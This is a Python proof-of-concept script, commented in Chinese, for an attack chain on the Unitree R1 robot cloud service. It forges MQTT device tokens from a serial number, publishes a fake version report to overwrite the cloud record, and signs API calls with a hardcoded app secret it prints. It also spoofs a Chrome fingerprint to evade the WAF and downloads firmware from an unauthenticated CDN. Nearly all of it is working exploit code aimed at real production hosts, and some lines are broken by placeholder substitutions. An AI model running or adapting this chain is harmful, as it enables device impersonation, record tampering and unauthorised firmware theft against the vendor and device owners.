#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Unitree R1 OTA 固件远程获取链 PoC(授权测试,仅用自有设备 SN)
=============================================================
漏洞链: 知 SN
  [1] 伪造 MQTT 令牌(公式不含任何秘密) → 以设备身份连云 broker
  [2] 发布伪造 reportVersion(自报旧版本) → 云端版本记录被改写(IDOR)
  [3] AppSign 硬编码 secret 实时签名 + chrome 指纹绕 WAF → 取升级清单
  [4] CDN 无签名无鉴权直下 .upk(打印地址, 可用 --download 直接下载)

用法:
  python ota_acquire_chain.py <SN> --token <App JWT>
  python ota_acquire_chain.py <SN> --token <App JWT> --download
  python ota_acquire_chain.py <SN> --restore --real-version 1.4.2

参数:
  SN              目标设备序列号(16位, 组播/BLE/标签可得, 无需接触设备)
  --token         任意 App 账号的登录 JWT(不绑定设备)。不给则尝试读 tools/.app_token 缓存
  --restore       测试结束后恢复云端版本记录
  --real-version  恢复时写入的真实版本(默认 1.4.2)

依赖: pip install paho-mqtt curl_cffi
"""
import sys, os, json, time, uuid, hashlib, argparse

BROKER = ('robot-mqtt.unitree.com', 17883)
API = 'https://robot-api.unitree.com/'
CDN = 'https://firmware-cdn.unitree.com'
APP_SECRET = 'XyvkwK45hp5PHfA8'   # App BaseConstant.java 硬编码, 公开常量
TOKEN_CACHE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           '..', 'tools', '.app_token')


def mqtt_token(sn):
    """令牌公式: "1|" + md5("unitree-"+SN+"-"+nonce) + "|" + nonce
    盐为固件内嵌公开常量, nonce 明文附回 => 令牌不含任何秘密, 可离线伪造"""
    nonce = uuid.uuid4().hex[:8]
    return "1|" + hashlib.md5(f"unitree-{sn}-{nonce}".encode()).hexdigest() + "|" + nonce


def publish_version(sn, version):
    """[1]+[2] 伪造设备身份接入 broker, 发布伪造 reportVersion"""
    import paho.mqtt.client as mqtt
    payload = {
        "cmd": "reportVersion",
        "modules": [{"hostAlias": "host1", "moduleName": "ai_sport",
                     "version": "1.0.2.153", "versionFallback": ""}],
        "msgId": str(int(time.time() * 1000)) + "000",
        "package": {"version": version},
        "sn": sn,
    }
    try:
        c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=sn)
    except (AttributeError, TypeError):
        c = mqtt.Client(client_id=sn)                    # client_id 必须等于 SN
    c.username_pw_set(username=sn, password=<密码_01>
    c.tls_set()
    c.connect(*BROKER, keepalive=15)
    c.loop_start()
    time.sleep(3)
    r = c.publish(f'msg/{sn}', json.dumps(payload))    # topic: msg/<SN>
    time.sleep(3)
    c.loop_stop(); c.disconnect()
    return r.rc


def signed_headers(token):
    """[3] AppSign = md5(secret + AppTimestamp + AppNonce), 时效约1-2分钟"""
    ts = str(int(time.time() * 1000)); nonce = uuid.uuid4().hex
    return {'Content-Type': 'application/json', 'Token': <访问令牌_01>,
            'AppTimestamp': ts, 'AppNonce': nonce,
            'AppSign': hashlib.md5((APP_SECRET + ts + nonce).encode()).hexdigest(),
            'AppName': 'B2', 'DevicePlatform': 'Android',
            'AppVersion': '2.1.2', 'channel': 'inland'}


def api_post(path, sn, token):
    from curl_cffi import requests as creq      # chrome 指纹绕 WAF(567/418)
    return creq.post(API + f'{path}?sn={sn}', headers=signed_headers(token),
                     json={}, impersonate='chrome', timeout=15).json()


def main():
    ap = argparse.ArgumentParser(description='Unitree R1 OTA 固件远程获取链 PoC')
    ap.add_argument('sn', help='目标设备 SN, 如 E39N1000XXXXXXXXX')
    ap.add_argument('--token', default=None,
                    help='App 登录 JWT(任意账号, 不绑设备); 缺省读 tools/.app_token 缓存')
    ap.add_argument('--fake-version', default='1.0.0', help='伪报的版本号(默认 1.0.0)')
    ap.add_argument('--restore', action='store_true', help='恢复云端版本记录后退出')
    ap.add_argument('--real-version', default='1.4.2', help='恢复时的真实版本(默认 1.4.2)')
    ap.add_argument('--download', action='store_true', help='直接下载固件包到当前目录')
    args = ap.parse_args()

    if not args.token:
        <访问令牌_01>
            args.token = <访问令牌_01>
            print('[i] 未指定 --token, 使用缓存:', TOKEN_CACHE)
        except Exception:
            pass

    # ---- 恢复模式 ----
    if args.restore:
        print(f'[restore] 恢复 SN={args.sn} 云端版本记录为 {args.real_version}')
        rc = publish_version(args.sn, args.real_version)
        print(f'          publish rc={rc} (0=云端已接受)')
        return

    # ---- [1][2] MQTT 令牌伪造 + 版本记录改写 ----
    print(f'[1/4] 伪造 MQTT 令牌接入 {BROKER[0]}:{BROKER[1]} (client_id=SN)')
    print(f'[2/4] 以设备身份伪报版本 {args.fake_version} ...')
    rc = publish_version(args.sn, args.fake_version)
    print(f'      publish rc={rc} (0=云端已接受伪造上报)')
    if rc != 0:
        print('[!] broker 拒绝了上报, 检查 SN 是否正确'); sys.exit(1)

    if not args.token:
        <访问令牌_01>'[!] 未提供 --token, 跳过 REST 验证。')
        print('    手动验证: POST firmware/package/version?sn= 应返回', args.fake_version)
        return

    # ---- [3] 验证版本记录 + 取升级清单 ----
    print('[3/4] AppSign 实时签名 + chrome 指纹, 查云端版本记录与升级清单 ...')
    v = api_post('firmware/package/version', args.sn, args.token)
    code = v.get('code')
    if code in (1001, 1002):
        print(f"[!] Token 校验失败: {v.get('errorMsg')} (code={code})")
        print('    1001=token过期 1002=未登录/伪造 => 重新获取 token')
        sys.exit(1)
    own = v.get('data')
    print(f'      云端版本记录 = {own}  (应为 {args.fake_version} => IDOR 改写生效)')
    if str(own) != args.fake_version:
        print('[!] 记录未改写成功, 检查第2步是否 rc=0'); sys.exit(1)

    lst = api_post('v1/firmware/package/upgrade/list', args.sn, args.token)
    items = lst.get('data') or []
    if not items:
        print('[!] 升级清单为空: 可能当前无在投升级活动'); sys.exit(1)
    for item in items:
        url = CDN + item['download']
        print(f"      firmwareId = {item['firmwareId']}  version = {item['version']}")
        print(f"      md5        = {item['md5']}")
        print(f"      download   = {url}")

    # ---- [4] CDN 无签名下载 ----
    if args.download:
        import urllib.request
        for item in items:
            name = item['packageName']
            print(f'[4/4] CDN 无鉴权下载 {name} ({int(item["storageLimit"])/1e6:.0f} MB) ...')
            urllib.request.urlretrieve(CDN + item['download'], name)
            md5 = hashlib.md5(open(name, 'rb').read()).hexdigest()
            ok = '一致 ✓' if md5 == item['md5'] else '不一致 ✗'
            print(f'      下载完成, MD5 {md5} 与清单{ok}')
    else:
        print('[4/4] CDN 无签名无鉴权, 直接下载即可:')
        print(f'      curl -o package.upk "{CDN + items[0]["download"]}"')
        print('      (加 --download 可由脚本直接下载并校验 MD5)')

    print()
    print(f'[!] 测试完毕请恢复版本记录:')
    print(f'    python {os.path.basename(__file__)} {args.sn} --restore --real-version <真实版本>')


if __name__ == '__main__':
    main()
